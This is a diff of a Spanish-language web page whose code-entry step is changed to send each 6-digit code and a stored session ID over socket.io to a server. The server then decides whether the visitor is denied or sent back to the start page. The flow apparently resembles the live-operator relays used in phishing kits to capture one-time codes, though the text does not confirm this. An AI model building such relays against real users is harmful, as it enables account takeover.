@@ -91,26 +91,41 @@
     <button onclick="validarCodigo()">Validar código</button>
   </div>
 
-  <script>
-    function validarCodigo() {
-      const codigo = document.getElementById("codigo").value;
-      const mensajeError = document.getElementById("mensajeError");
-      const codigoInput = document.getElementById("codigo");
+  <script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+  const sessionId = localStorage.getItem("sessionId");
 
-      mensajeError.textContent = "";
-      codigoInput.classList.remove("campo-requerido");
+  socket.emit("reconectar", sessionId);
 
-      if (!codigo) {
-        mensajeError.textContent = "El código es obligatorio";
-        codigoInput.classList.add("campo-requerido");
-      } else if (!/^\d{6}$/.test(codigo)) {
-        mensajeError.textContent = "El código debe tener 6 dígitos numéricos";
-        codigoInput.classList.add("campo-requerido");
-      } else {
-        alert("Código válido. Aquí se redirigiría al resultado final.");
-        // window.location.href = "resultado.html";
-      }
+  function validarCodigo() {
+    const codigo = document.getElementById("codigo").value;
+    const mensajeError = document.getElementById("mensajeError");
+    const codigoInput = document.getElementById("codigo");
+
+    mensajeError.textContent = "";
+    codigoInput.classList.remove("campo-requerido");
+
+    if (!codigo) {
+      mensajeError.textContent = "El código es obligatorio";
+      codigoInput.classList.add("campo-requerido");
+    } else if (!/^\d{6}$/.test(codigo)) {
+      mensajeError.textContent = "El código debe tener 6 dígitos numéricos";
+      codigoInput.classList.add("campo-requerido");
+    } else {
+      // Enviar al servidor por socket
+      socket.emit("codigoIngresado", { codigo, sessionId });
     }
-  </script>
+  }
+
+  socket.on("respuestaCodigo", (decision) => {
+    if (decision === "error") {
+      window.location.href = "denegado.html";
+    } else if (decision === "pedir_usuario") {
+      window.location.href = "index.html";
+    }
+  });
+</script>
+
 </body>
 </html>
